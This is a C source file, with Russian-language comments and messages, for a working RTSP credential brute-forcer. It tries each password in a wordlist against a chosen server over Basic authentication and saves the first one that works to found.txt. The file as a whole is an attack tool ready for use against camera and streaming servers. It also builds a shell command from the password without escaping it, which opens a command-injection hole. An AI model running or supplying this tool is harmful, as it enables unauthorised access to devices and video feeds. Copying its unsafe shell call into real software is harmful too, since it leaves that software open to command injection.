#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <signal.h>

#define BUFFER_SIZE 2048
#define PASSWORD_LENGTH 100

volatile int running = 1;

// Обработка SIGINT (Ctrl+C)
void handle_sigint(int sig) {
    printf("\n\033[1;33m[!] Прерывание... Завершаем.\033[0m\n");
    running = 0;
}

// Кодирование Base64 через системную команду
char *base64_encode(const char *input) {
    char command[BUFFER_SIZE];
    char *result = malloc(BUFFER_SIZE);
    FILE *fp;

    snprintf(command, sizeof(command), "echo -n \"%s\" | base64", input);
    fp = popen(command, "r");
    if (!fp) {
        perror("Ошибка при запуске base64");
        free(result);
        return NULL;
    }

    fgets(result, BUFFER_SIZE, fp);
    result[strcspn(result, "\n")] = '\0'; // Удаляем \n

    pclose(fp);
    return result;
}

// Подключение с таймаутом
int connect_with_timeout(int sockfd, struct sockaddr *addr, int timeout_sec) {
    fcntl(sockfd, F_SETFL, O_NONBLOCK);
    int res = connect(sockfd, addr, sizeof(*addr));
    if (res < 0) {
        fd_set fdset;
        struct timeval tv;

        FD_ZERO(&fdset);
        FD_SET(sockfd, &fdset);
        tv.tv_sec = timeout_sec;
        tv.tv_usec = 0;

        if (select(sockfd + 1, NULL, &fdset, NULL, &tv) > 0) {
            int so_error;
            socklen_t len = sizeof so_error;
            getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &so_error, &len);
            if (so_error == 0) {
                fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) & ~O_NONBLOCK);
                return 0;
            }
        }
        return -1;
    }
    fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) & ~O_NONBLOCK);
    return 0;
}

// Попытка авторизации
int rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    char userpass[200];

    snprintf(userpass, sizeof(userpass), "%s:%s", username, password);
    char *auth_encoded = base64_encode(userpass);
    if (!auth_encoded) return 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Ошибка создания сокета");
        free(auth_encoded);
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect_with_timeout(sock, (struct sockaddr *)&server_addr, 5) < 0) {
        printf("\033[1;31m[!] Таймаут подключения к %s\033[0m\n", target_ip);
        close(sock);
        free(auth_encoded);
        return 0;
    }

    snprintf(request, sizeof(request),
             "OPTIONS rtsp://%s/ RTSP/1.0\r\n"
             "CSeq: 1\r\n"
             "Authorization: Basic %s\r\n\r\n",
             target_ip, auth_encoded);

    send(sock, request, strlen(request), 0);
    recv(sock, response, sizeof(response) - 1, 0);
    response[sizeof(response) - 1] = '\0';

    if (strstr(response, "200 OK")) {
        printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password);

        FILE *out = fopen("found.txt", "w");
        if (out) {
            fprintf(out, "IP: %s\nЛогин: %s\nПароль: %s\n", target_ip, username, password);
            fclose(out);
        }

        close(sock);
        free(auth_encoded);
        return 1;
    } else {
        printf("\033[0;31m[✘] Неверный пароль: %s\033[0m\n", password);
    }

    close(sock);
    free(auth_encoded);
    return 0;
}

int main() {
    char target_ip[64];
    int target_port = 554;
    char username[100];
    char password[PASSWORD_LENGTH];

    signal(SIGINT, handle_sigint);

    printf("Введите IP RTSP сервера: ");
    scanf("%63s", target_ip);
    getchar();

    printf("Введите логин: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = '\0';

    FILE *file = fopen("passwords.txt", "r");
    if (!file) {
        perror("Ошибка: файл passwords.txt не найден");
        return 1;
    }

    printf("\n\033[1;36m[*] Начинаем брутфорс...\033[0m\n\n");

    while (fgets(password, PASSWORD_LENGTH, file) && running) {
        password[strcspn(password, "\n")] = 0;

        if (rtsp_bruteforce(target_ip, target_port, username, password)) {
            printf("\n\033[1;34m[*] Пароль найден. Сохранён в found.txt. Программа завершена.\033[0m\n");
            break;
        }

        sleep(1);
    }

    fclose(file);
    return 0;
}
